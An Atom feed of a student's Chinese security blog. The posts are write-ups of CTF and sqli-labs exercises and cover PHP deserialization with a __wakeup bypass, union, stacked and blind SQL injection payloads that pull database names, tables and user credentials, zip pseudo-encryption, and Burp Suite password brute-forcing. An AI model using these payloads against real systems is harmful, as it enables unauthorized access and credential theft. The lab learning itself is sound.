<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cxd的博客</title>
  
  
  <link href="http://cxdshibaba.github.io/atom.xml" rel="self"/>
  
  <link href="http://cxdshibaba.github.io/"/>
  <updated>2022-04-14T08:50:51.575Z</updated>
  <id>http://cxdshibaba.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>序列化与反序列化</title>
    <link href="http://cxdshibaba.github.io/2022/04/12/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://cxdshibaba.github.io/2022/04/12/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-04-12T12:42:55.000Z</published>
    <updated>2022-04-14T08:50:51.575Z</updated>
    
    <content type="html"><![CDATA[<p>序列化通俗来讲就是将对象转化为可以传输的字符串；反序列化就是把那串可以传输的字符串再变回对象。<br>例：序列化将对象转化为可传输的字符串：<br>首先定义一个对象：</p><?phpclass chybeta{undefined        var $test = '123';}$class1 = new chybeta;    //这里就是创建啦一个新的对象$class1_ser = serialize($class1);   //将这个对象进行字符串封装，就是对其进行序列化print_r($class1_ser);?><p>这里输出的结果就是将对象序列化后的可传输的字符串;将这个php文件运行一下就可以啦：<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/1ac671f5521a189b.png"><br>O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;}<br>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型<br>                             魔法函数:<br>__constuct()    在创建对象是自动调用<br>__destuct()  相当于c++中的析构最后会将对象销毁，所以在对象销毁时 被调用<br>__toString()    但一个对象被当成字符串使用时被调用<br>__sleep()   当对象被序列化之前使用<br>__wakeup()  将在被序列化后立即被调用  //咱们这道题就是利用的这个来利用序列化的<br>这些就是经常在序列化与反序列化中遇到的魔法函数了,一般魔法函数是以__开头的,碰到时可想想能不能用序列化与反序列化漏洞<br>实例分析：<br><img src="https://s3.bmp.ovh/imgs/2022/04/14/7716c89a267c79f0.png"><br>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这是一个绕过点。<br>当被反序列化的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得_wakeup()函数失效，就是问题的关键所在。所以对其进行修改：<br>O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;序列化通俗来讲就是将对象转化为可以传输的字符串；反序列化就是把那串可以传输的字符串再变回对象。&lt;br&gt;例：序列化将对象转化为可传输的字符串：&lt;br&gt;首先定义一个对象：&lt;/p&gt;
&lt;?php

class chybeta{undefined

        var $test</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>堆叠注入</title>
    <link href="http://cxdshibaba.github.io/2022/04/12/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <id>http://cxdshibaba.github.io/2022/04/12/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
    <published>2022-04-12T11:14:35.000Z</published>
    <updated>2022-04-12T11:35:14.790Z</updated>
    
    <content type="html"><![CDATA[<p>首先发现题目过滤了以下关键字<br><img src="https://i.bmp.ovh/imgs/2022/04/12/f29ffb1c7f8e97de.png"><br>接下来尝试堆叠注入<br>查库：1’;show databases;–+<br><img src="https://i.bmp.ovh/imgs/2022/04/12/1d9547a6d4887d65.png"><br>查表：1’;show tables;–+<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/a9578ab6c1a29a49.png"><br>分别查两个字段<br>1’; show columns from <code>1919810931114514</code> ;–+<br>1’; show columns from words ;–+<br>在1919810931114514中发现flag<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/d94cb4e686054ad0.png"><br>接着可采取handler语句取flag<br>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;–+<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/7ca5ac3abc251cf2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先发现题目过滤了以下关键字&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2022/04/12/f29ffb1c7f8e97de.png&quot;&gt;&lt;br&gt;接下来尝试堆叠注入&lt;br&gt;查库：1’;show databases;–+&lt;br&gt;&lt;img src=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>解zip伪加密</title>
    <link href="http://cxdshibaba.github.io/2022/04/10/%E8%A7%A3zip%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
    <id>http://cxdshibaba.github.io/2022/04/10/%E8%A7%A3zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</id>
    <published>2022-04-10T07:08:26.000Z</published>
    <updated>2022-04-10T07:16:27.593Z</updated>
    
    <content type="html"><![CDATA[<p>一个ZIP压缩包由三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志。<br>50 4B 03 04，这是压缩源文件数据区头文件标记<br>50 4B 01 02，这是压缩源文件目录区头文件标记：<br>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密<br>例：<br>无加密<br>压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0102四个bytes之后）<br>假加密<br>压缩源文件数据区的全局加密应当为00 00 （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为09 00（504B0102四个bytes之后）<br>真加密<br>压缩源文件数据区的全局加密应当为09 00 （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为09 00 （504B0102四个bytes之后）<br><img src="https://s3.bmp.ovh/imgs/2022/04/10/305a2b0b2a5be547.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一个ZIP压缩包由三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志。&lt;br&gt;50 4B 03 04，这是压缩源文件数据区头文件标记&lt;br&gt;50 4B 01 02，这是压缩源文件目录区头文件标记：&lt;br&gt;全局方式位标记的四个数字中只有第二个数字</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>修改图片宽高</title>
    <link href="http://cxdshibaba.github.io/2022/04/10/%E4%BF%AE%E6%94%B9%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98/"/>
    <id>http://cxdshibaba.github.io/2022/04/10/%E4%BF%AE%E6%94%B9%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98/</id>
    <published>2022-04-10T07:04:37.000Z</published>
    <updated>2022-04-10T07:06:54.215Z</updated>
    
    <content type="html"><![CDATA[<p>winhex中可以修改图片宽高找到flag，从第二行开始，前四位是宽，后四位是高。<br><img src="https://s3.bmp.ovh/imgs/2022/04/10/f36e549b6978016c.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;winhex中可以修改图片宽高找到flag，从第二行开始，前四位是宽，后四位是高。&lt;br&gt;&lt;img src=&quot;https://s3.bmp.ovh/imgs/2022/04/10/f36e549b6978016c.png&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>dirsearch命令</title>
    <link href="http://cxdshibaba.github.io/2022/02/23/dirsearch%E5%91%BD%E4%BB%A4/"/>
    <id>http://cxdshibaba.github.io/2022/02/23/dirsearch%E5%91%BD%E4%BB%A4/</id>
    <published>2022-02-23T08:03:25.000Z</published>
    <updated>2022-02-23T08:06:55.854Z</updated>
    
    <content type="html"><![CDATA[<p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。<br>-u 指定url<br>-e 指定网站语言<br>-w 可以加上自己的字典（带上路径）<br>-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）<br>–random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）<br> 例：<br><img src="https://i.bmp.ovh/imgs/2022/02/1485fb69f2928d9c.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。&lt;br&gt;-u 指定url&lt;br&gt;-e 指定网站语言&lt;br&gt;-w 可以加上自己的字典（带上路径）&lt;br&gt;-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）&lt;br&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>第一次参加闽盾杯</title>
    <link href="http://cxdshibaba.github.io/2021/12/03/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%82%E5%8A%A0%E9%97%BD%E7%9B%BE%E6%9D%AF/"/>
    <id>http://cxdshibaba.github.io/2021/12/03/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%82%E5%8A%A0%E9%97%BD%E7%9B%BE%E6%9D%AF/</id>
    <published>2021-12-03T10:03:57.000Z</published>
    <updated>2021-12-03T10:11:51.099Z</updated>
    
    <content type="html"><![CDATA[<p>昨天第一次参加闽盾杯，题目好难。。。随便写一题<br>附件下载打开后显示<br><img src="https://i.bmp.ovh/imgs/2021/12/215d13e5b6493d32.png"><br>题目提示Modbus/tcp中的最长的，用wireshark打开，在搜索栏输入tcp，点击length，找到flag<br><img src="https://i.bmp.ovh/imgs/2021/12/2d1d16fc379a5448.png"><br><img src="https://i.bmp.ovh/imgs/2021/12/8ad4c64f9550e638.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;昨天第一次参加闽盾杯，题目好难。。。随便写一题&lt;br&gt;附件下载打开后显示&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/12/215d13e5b6493d32.png&quot;&gt;&lt;br&gt;题目提示Modbus/tcp中的最长的，用wireshark</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>finalsql</title>
    <link href="http://cxdshibaba.github.io/2021/11/21/finalsql/"/>
    <id>http://cxdshibaba.github.io/2021/11/21/finalsql/</id>
    <published>2021-11-21T03:41:30.000Z</published>
    <updated>2021-11-21T03:48:41.352Z</updated>
    
    <content type="html"><![CDATA[<p>今天来看看学长布置的题目，，打开网页，在用户名和密码上分别输入order by、union select等字符，发现都被过滤掉<br><img src="https://i.bmp.ovh/imgs/2021/11/576b5a8e3c9d3a34.png"><br>接着按学长的提示，用python爆破盲注，偷一下学长的脚本<br><img src="https://i.bmp.ovh/imgs/2021/11/60af41f9dfe7db65.png"><br>flag就出来啦！！（脚本一点都看不懂）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天来看看学长布置的题目，，打开网页，在用户名和密码上分别输入order by、union select等字符，发现都被过滤掉&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/576b5a8e3c9d3a34.png&quot;&gt;&lt;br&gt;接着按</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less-8</title>
    <link href="http://cxdshibaba.github.io/2021/11/19/less-8/"/>
    <id>http://cxdshibaba.github.io/2021/11/19/less-8/</id>
    <published>2021-11-19T14:54:24.000Z</published>
    <updated>2021-11-19T15:05:30.029Z</updated>
    
    <content type="html"><![CDATA[<p>首先输入?id=1’，出现报错，说明存在漏洞注入，同时用联合查询语句都没有出现回显，说明本体为盲注，使用PyCharm爆破<br>首先写脚本，爆破库名，payload:and substr(database(),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/40ac86564e6d5fa5.png"><br>找到库名为security<br>接着爆破表名，payload:nd substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/7fbd316092ee8c20.png"><br>接着查找users里面的数据，payload:and substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/60b607a19434dffe.png"><br>最后查找password和username<br><img src="https://s3.bmp.ovh/imgs/2021/11/d2ccc5020876c5b0.png"><br><img src="https://s3.bmp.ovh/imgs/2021/11/9e84d0f9b2c8ea8c.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先输入?id=1’，出现报错，说明存在漏洞注入，同时用联合查询语句都没有出现回显，说明本体为盲注，使用PyCharm爆破&lt;br&gt;首先写脚本，爆破库名，payload:and substr(database(),{},1)=’{}’–+&lt;br&gt;&lt;img src=&quot;https</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less-5</title>
    <link href="http://cxdshibaba.github.io/2021/11/16/less-5/"/>
    <id>http://cxdshibaba.github.io/2021/11/16/less-5/</id>
    <published>2021-11-16T14:09:20.000Z</published>
    <updated>2021-11-16T14:32:22.037Z</updated>
    
    <content type="html"><![CDATA[<p>首先输入?id=1测试，未发现漏洞，接着输入?=1’，报错，说明存在注入点<br><img src="https://i.bmp.ovh/imgs/2021/11/3629592a82d2adf7.png"><br>接着使用orde by查询可知有三列<br><img src="https://i.bmp.ovh/imgs/2021/11/49412bcd178ce46f.png"><br>接着用联合查询语句<br><img src="https://i.bmp.ovh/imgs/2021/11/48b1ca9a65a8abd3.png"><br>没有回显，无法使用联合查询语句，说明本题为盲注，可尝试用left函数及burpsuite<br><img src="https://i.bmp.ovh/imgs/2021/11/d7c80ae072931d36.png"><br>由burpsuite可知数据库的首位字母为’s’<br><img src="https://i.bmp.ovh/imgs/2021/11/b44a1962cd714a79.png"><br>第二位字母为’e’<br>由此得出数据库名为’security’</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先输入?id=1测试，未发现漏洞，接着输入?=1’，报错，说明存在注入点&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/3629592a82d2adf7.png&quot;&gt;&lt;br&gt;接着使用orde by查询可知有三列&lt;br&gt;&lt;img sr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>题目easy_sql</title>
    <link href="http://cxdshibaba.github.io/2021/11/11/%E9%A2%98%E7%9B%AEeasy-sql/"/>
    <id>http://cxdshibaba.github.io/2021/11/11/%E9%A2%98%E7%9B%AEeasy-sql/</id>
    <published>2021-11-11T11:56:09.000Z</published>
    <updated>2021-11-11T12:23:32.224Z</updated>
    
    <content type="html"><![CDATA[<p>培训的题目，感觉有点懵，想了好久……..<br>首先看到页面参数为wllm<br>先尝试输入？wllm=1<br><img src="https://i.bmp.ovh/imgs/2021/11/b18c89c31a27ed32.png"><br>接着尝试？wllm=1’<br><img src="https://i.bmp.ovh/imgs/2021/11/f9eafa4bdf0aa2a9.png"><br>说明存在sql出入漏洞，接着用order by判断有几行<br><img src="https://i.bmp.ovh/imgs/2021/11/ad1731300884dfca.png"><br>判断有3行，接着先查询所有数据库，输入?wllm=-1’ union select 1,2,database()–+<br><img src="https://i.bmp.ovh/imgs/2021/11/178dde1cc45bbe2a.png"><br>接着查询test_db表，输入?wllm=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’test_db’–+<br><img src="https://i.bmp.ovh/imgs/2021/11/a36e17a705d6ca28.png"><br>接着查test_tb字段，输入?wllm=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’test_tb’–+<br><img src="https://i.bmp.ovh/imgs/2021/11/b837ab4a84da968d.png"><br>最后取出flag，输入?wllm=-1’ union select 1,2,flag from test_tb–+<br><img src="https://i.bmp.ovh/imgs/2021/11/d329211248661b07.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;培训的题目，感觉有点懵，想了好久……..&lt;br&gt;首先看到页面参数为wllm&lt;br&gt;先尝试输入？wllm=1&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/b18c89c31a27ed32.png&quot;&gt;&lt;br&gt;接着尝试？wllm=1’&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MYSQL知识</title>
    <link href="http://cxdshibaba.github.io/2021/11/04/MYSQL%E7%9F%A5%E8%AF%86/"/>
    <id>http://cxdshibaba.github.io/2021/11/04/MYSQL%E7%9F%A5%E8%AF%86/</id>
    <published>2021-11-04T13:58:11.000Z</published>
    <updated>2021-11-04T13:58:45.446Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.bmp.ovh/imgs/2021/11/3ac693d22e56ecfa.png"><br>好难理解。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/3ac693d22e56ecfa.png&quot;&gt;&lt;br&gt;好难理解。。。。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MYSQL中concat_ws()函数</title>
    <link href="http://cxdshibaba.github.io/2021/10/31/MYSQL%E4%B8%ADconcat-ws-%E5%87%BD%E6%95%B0/"/>
    <id>http://cxdshibaba.github.io/2021/10/31/MYSQL%E4%B8%ADconcat-ws-%E5%87%BD%E6%95%B0/</id>
    <published>2021-10-31T15:31:19.000Z</published>
    <updated>2021-10-31T15:36:56.099Z</updated>
    
    <content type="html"><![CDATA[<p>指定分隔符<br>使用函数CONCAT_WS()。语法为：CONCAT_WS(separator,str1,str2,…)<br>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符放在要连接的两个字符串之间。分<br>隔符可以是一个字符串，也可以是其它参数。<br>例：concat_ws(0x7e,username,password)<br>意思为将usernme和password以波浪号的形式进行隔开（0x7e为波浪号）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;指定分隔符&lt;br&gt;使用函数CONCAT_WS()。语法为：CONCAT_WS(separator,str1,str2,…)&lt;br&gt;CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符放</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MYSQL中group_concat用法</title>
    <link href="http://cxdshibaba.github.io/2021/10/25/MYSQL%E4%B8%ADgroup-concat%E7%94%A8%E6%B3%95/"/>
    <id>http://cxdshibaba.github.io/2021/10/25/MYSQL%E4%B8%ADgroup-concat%E7%94%A8%E6%B3%95/</id>
    <published>2021-10-25T14:17:24.000Z</published>
    <updated>2021-10-25T14:22:15.739Z</updated>
    
    <content type="html"><![CDATA[<p>将group by产生的同一个分组中的值连接起来，返回一个字符串结果。group_concat函数首先根据group by指定的列进行分组，将同一组的列显示出来，<br>并且用分隔符分隔。由函数参数（字段名）决定要返回的列。例如：<br><img src="https://i.bmp.ovh/imgs/2021/10/6049e54bbe4a9d3b.png"><br>执行如下查询及结果：<br><img src="https://i.bmp.ovh/imgs/2021/10/520ea0b690b634f6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;将group by产生的同一个分组中的值连接起来，返回一个字符串结果。group_concat函数首先根据group by指定的列进行分组，将同一组的列显示出来，&lt;br&gt;并且用分隔符分隔。由函数参数（字段名）决定要返回的列。例如：&lt;br&gt;&lt;img src=&quot;https://</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MYSQL基本用法</title>
    <link href="http://cxdshibaba.github.io/2021/10/13/MYSQL/"/>
    <id>http://cxdshibaba.github.io/2021/10/13/MYSQL/</id>
    <published>2021-10-13T11:54:04.000Z</published>
    <updated>2021-10-13T12:24:00.533Z</updated>
    
    <content type="html"><![CDATA[<p>打开MYSQL命令行输入密码<br><img src="https://i.bmp.ovh/imgs/2021/10/6088060157ec91b6.png"><br>接着首先看里面的表 输入show databases;（；一定要加）这时候会显示里面所有的表<br><img src="https://i.bmp.ovh/imgs/2021/10/6904ea165406b536.png"><br>接着我们尝试使用表security，输入use security;   此时显示数据库已被改变，接着再输入show tables;此时数据库里所含的表就全部显示<br><img src="https://i.bmp.ovh/imgs/2021/10/9a57690025029368.png"><br>若要拿到users里面的数据，则使用select语句，输入select * from users;<br><img src="https://i.bmp.ovh/imgs/2021/10/f994cc89fdc84eea.png"><br>万能语句<br>查库：select schema_name from information_schema.schemata<br>查表：select table_name from information_schema.tables where table_schema=’要查的表名’<br>查列：select column_name from information_schema.columns where table_name=’要查的列名’<br>查字段：select XXX,XXX from security.users(XXX为要查的字段）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开MYSQL命令行输入密码&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/10/6088060157ec91b6.png&quot;&gt;&lt;br&gt;接着首先看里面的表 输入show databases;（；一定要加）这时候会显示里面所有的表&lt;br&gt;&lt;i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL语句</title>
    <link href="http://cxdshibaba.github.io/2021/10/12/SQL%E8%AF%AD%E5%8F%A5/"/>
    <id>http://cxdshibaba.github.io/2021/10/12/SQL%E8%AF%AD%E5%8F%A5/</id>
    <published>2021-10-12T11:14:01.000Z</published>
    <updated>2021-10-13T11:52:58.527Z</updated>
    
    <content type="html"><![CDATA[<p>concat_ws（）：从数据库里取N个字段，然后组合到一起用符号分割显示，第一个参数剩余参数间的分隔符<br>char（）：将十进制ASCII码转化成字符<br>user（）：返回当前数据库连接使用的用户<br>database（）：返回当前数据库连接使用的数据库<br>version（）：返回当前数据库的版本<br>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a，且值最接近a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by cluase分组语句，按照cluase对查询结果分组<br>16进制转换地址：<a href="http://www.bejson.com/convert/ox2str/">http://www.bejson.com/convert/ox2str/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;concat_ws（）：从数据库里取N个字段，然后组合到一起用符号分割显示，第一个参数剩余参数间的分隔符&lt;br&gt;char（）：将十进制ASCII码转化成字符&lt;br&gt;user（）：返回当前数据库连接使用的用户&lt;br&gt;database（）：返回当前数据库连接使用的数据库&lt;br&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://cxdshibaba.github.io/2021/10/11/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://cxdshibaba.github.io/2021/10/11/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-10-11T14:15:50.000Z</published>
    <updated>2021-10-11T14:25:37.623Z</updated>
    
    <content type="html"><![CDATA[<p>第一次尝试SQL注入<br><img src="https://i.bmp.ovh/imgs/2021/10/a476b74f2aea8baf.png"><br>使用HackBar输入不同的id值就会返回不同的结果<br><img src="https://i.bmp.ovh/imgs/2021/10/a98b8197325fc4e6.png"><br><img src="https://i.bmp.ovh/imgs/2021/10/901830135911bfb0.png"><br>利用 order by 来判断users表中有几列<br><img src="https://i.bmp.ovh/imgs/2021/10/32f51b600eebe512.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一次尝试SQL注入&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/10/a476b74f2aea8baf.png&quot;&gt;&lt;br&gt;使用HackBar输入不同的id值就会返回不同的结果&lt;br&gt;&lt;img src=&quot;https://i.bmp.ov</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>靶场搭建</title>
    <link href="http://cxdshibaba.github.io/2021/10/11/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    <id>http://cxdshibaba.github.io/2021/10/11/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</id>
    <published>2021-10-11T13:53:49.000Z</published>
    <updated>2021-10-11T14:07:37.086Z</updated>
    
    <content type="html"><![CDATA[<p>首先下载phpstudy2018<br><img src="https://i.bmp.ovh/imgs/2021/10/37d34a718091421c.png"><br>解压完后启动<br><img src="https://i.bmp.ovh/imgs/2021/10/26e712311d5c7810.png"><br>接着在<a href="https://github.com/Audi-1/sqli-labs%E5%9C%B0%E5%9D%80%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6">https://github.com/Audi-1/sqli-labs地址中下载所有文件</a><br><img src="https://i.bmp.ovh/imgs/2021/10/5ff3602cee7d3b16.png"><br>将文件放在phpStudy\PHPTutorial\WWW\sqli-labs-master<br><img src="https://i.bmp.ovh/imgs/2021/10/2a7cc925c94fc6a7.png"><br>打开 phpStudy\PHPTutorial\WWW\sqli-labs-master\sql-connections\db-creds将$dbpass =’root’;<br>最后打开网站<a href="http://127.0.0.7/sqli-labs-master/">http://127.0.0.7/sqli-labs-master/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先下载phpstudy2018&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/10/37d34a718091421c.png&quot;&gt;&lt;br&gt;解压完后启动&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/10</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>密码爆破</title>
    <link href="http://cxdshibaba.github.io/2021/10/01/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    <id>http://cxdshibaba.github.io/2021/10/01/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</id>
    <published>2021-10-01T14:22:08.000Z</published>
    <updated>2021-10-07T09:27:28.785Z</updated>
    
    <content type="html"><![CDATA[<p>首先在创建文本，将若干条弱口令字典放在文本中，接着打开要爆破的网页，同时打开Burp Suite,对网页进行拦截，接着在HTTP history中找到拦截的网站，<br>将其发送到测试器，接着在Intruder中的Payload载入有效载荷选项，将弱口令字典的文本载入，接着在Position中将用户名两边的&amp;符号删掉，固定爆破密码<br>最后进行爆破<br><img src="https://i.bmp.ovh/imgs/2021/10/fc16f9771bb6d067.png"><br><img src="https://i.bmp.ovh/imgs/2021/10/b01d4ddcf3f72ec1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先在创建文本，将若干条弱口令字典放在文本中，接着打开要爆破的网页，同时打开Burp Suite,对网页进行拦截，接着在HTTP history中找到拦截的网站，&lt;br&gt;将其发送到测试器，接着在Intruder中的Payload载入有效载荷选项，将弱口令字典的文本载入，接着</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>用盗版Burp Suite抓包</title>
    <link href="http://cxdshibaba.github.io/2021/09/30/%E7%94%A8Burp-Suite%E6%8A%93%E5%8C%85/"/>
    <id>http://cxdshibaba.github.io/2021/09/30/%E7%94%A8Burp-Suite%E6%8A%93%E5%8C%85/</id>
    <published>2021-09-30T13:18:10.000Z</published>
    <updated>2021-10-07T08:45:39.617Z</updated>
    
    <content type="html"><![CDATA[<p>首先打开Burp Suite，接着开临时项目，接着使用Burp的默认值，接着在Proxy中Open Browser，把要抓包的网址复制到Browser中的网页，接着从<br>HTTP history中找到网址内容<br><img src="https://i.bmp.ovh/imgs/2021/10/3b92b6094495de50.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先打开Burp Suite，接着开临时项目，接着使用Burp的默认值，接着在Proxy中Open Browser，把要抓包的网址复制到Browser中的网页，接着从&lt;br&gt;HTTP history中找到网址内容&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://cxdshibaba.github.io/2021/09/26/hello-world/"/>
    <id>http://cxdshibaba.github.io/2021/09/26/hello-world/</id>
    <published>2021-09-26T11:52:59.764Z</published>
    <updated>2021-09-21T06:03:13.483Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
